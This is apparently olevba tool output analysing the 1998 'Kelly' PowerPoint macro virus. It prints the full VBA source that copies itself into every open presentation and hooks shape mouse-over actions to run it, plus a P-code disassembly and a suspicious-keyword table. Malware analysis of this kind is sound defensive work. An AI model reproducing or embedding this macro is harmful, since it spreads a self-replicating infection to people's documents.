olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPPoint.Kelly.ppt
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Kelly.bas 
in file: Virus.MSPPoint.Kelly.ppt - OLE stream: 'VBA/Kelly'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Kelly
Sub ι()
On Error Resume Next
Set α = ActivePresentation.VBProject.VBComponents("Kelly").CodeModule
ν = α.CountOfLines + 1: λ = α.Lines(1, ν)
For Each ν In Presentations
If ν.VBProject.VBComponents(α).Name <> α Then
ν.VBProject.VBComponents.Add(1).Name = α
ν.VBProject.VBComponents(α).CodeModule.InsertLines 1, λ
For Each η In ν.Slides(ν.Slides.Count).Shapes
If η.ActionSettings(ppMouseOver).Action = 0 Then _
η.ActionSettings(ppMouseOver).Action = ppActionRunMacro: _
η.ActionSettings(ppMouseOver).Run = "ι"
Next: End If: Next
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSPPoint.Kelly.ppt
' ===============================================================================
' Module streams:
' VBA/Kelly - 1751 bytes
' Line #0:
' 	QuoteRem 0x0000 0x002C "Copyright (C) 1998 by FlyShadow ~^^~ - Kelly"
' Line #1:
' 	FuncDefn (Sub ι())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	SetStmt 
' 	LitStr 0x0005 "Kelly"
' 	Ld ActivePresentation 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set α 
' Line #4:
' 	Ld α 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St ν 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld ν 
' 	Ld α 
' 	ArgsMemLd Lines 0x0002 
' 	St λ 
' Line #5:
' 	StartForVariable 
' 	Ld ν 
' 	EndForVariable 
' 	Ld Presentations 
' 	ForEach 
' Line #6:
' 	Ld α 
' 	Ld ν 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld α 
' 	Ne 
' 	IfBlock 
' Line #7:
' 	Ld α 
' 	LitDI2 0x0001 
' 	Ld ν 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	MemSt New 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld λ 
' 	Ld α 
' 	Ld ν 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #9:
' 	StartForVariable 
' 	Ld η 
' 	EndForVariable 
' 	Ld ν 
' 	MemLd Slides 
' 	MemLd Count 
' 	Ld ν 
' 	ArgsMemLd Slides 0x0001 
' 	MemLd Shapes 
' 	ForEach 
' Line #10:
' 	LineCont 0x0008 0C 00 00 00 17 00 00 00
' 	Ld ppMouseOver 
' 	Ld η 
' 	ArgsMemLd ActionSettings 0x0001 
' 	MemLd Action 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ppActionRunMacro 
' 	Ld ppMouseOver 
' 	Ld η 
' 	ArgsMemLd ActionSettings 0x0001 
' 	MemSt Action 
' 	BoS 0x0000 
' 	LitStr 0x0002 "ι"
' 	Ld ppMouseOver 
' 	Ld η 
' 	ArgsMemLd ActionSettings 0x0001 
' 	MemSt Run 
' 	EndIf 
' Line #11:
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #12:
' 	EndSub 
' Line #13:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

